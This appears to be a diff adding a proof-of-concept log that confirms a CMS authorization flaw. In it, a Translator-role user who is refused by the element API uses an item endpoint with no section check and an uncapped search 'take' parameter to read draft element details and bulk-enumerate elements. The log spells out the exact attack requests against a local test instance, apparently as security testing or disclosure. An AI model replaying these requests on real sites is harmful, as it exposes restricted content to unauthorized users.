@@ -1,0 +1,17 @@
+==============================================================================
+VULN-048: item/element[/search] floor-only + uncapped take → cross-section element leak/enumeration
+==============================================================================
+[INFO] target: http://localhost:29184
+[INFO] vulnerable code path: ElementItemControllerBase.cs:12 (floor only); SearchElementItemController.cs:51 (take uncapped)
+[SETUP] admin authenticated to Management API
+[SETUP] created element 'SecretElement_fd94852f' (key=ae2bab5c-6c05-4afc-afce-34cc6c795ab2) via the Library-gated /element endpoint
+[SETUP] created default Translator lowuser_8bfedf10@example.invalid; allowedSections=['Umb.Section.Translation']
+[INFO] Translator holds NO Library section — the element-tree boundary is what we cross below
+[STEP] baseline: GET /element/{key} via the real endpoint ([Authorize(TreeAccessElements)] + per-node)
+[PROOF] GET /element/{key} → 403 Forbidden — the element API rejects this identity (as it should)
+[STEP] attack: GET item/element?id={key} (floor-only item endpoint) — no section, no per-node check
+[PROOF] item/element → 200 leaked auth-sensitive fields: name='SecretElement_fd94852f' state='Draft' isTrashed=False documentType=657131df-108f-4007-b3b9-754d8c5acffd
+[STEP] attack: GET item/element/search?query=Secret&take=1000000 — uncapped take = bulk enumeration
+[PROOF] item/element/search?take=1000000 → 200 (take NOT clamped), total=4; enumerated element names include ['SecretElement_01386693', 'SecretElement_03a0368b', 'SecretElement_6fec41cc', 'SecretElement_fd94852f']
+[PROOF] a Translator the element API 403s just enumerated the element set across the section boundary
+==> VULN-048: CONFIRMED — Translator (403 on /element) read element State/IsTrashed and bulk-enumerated via item/element[/search]
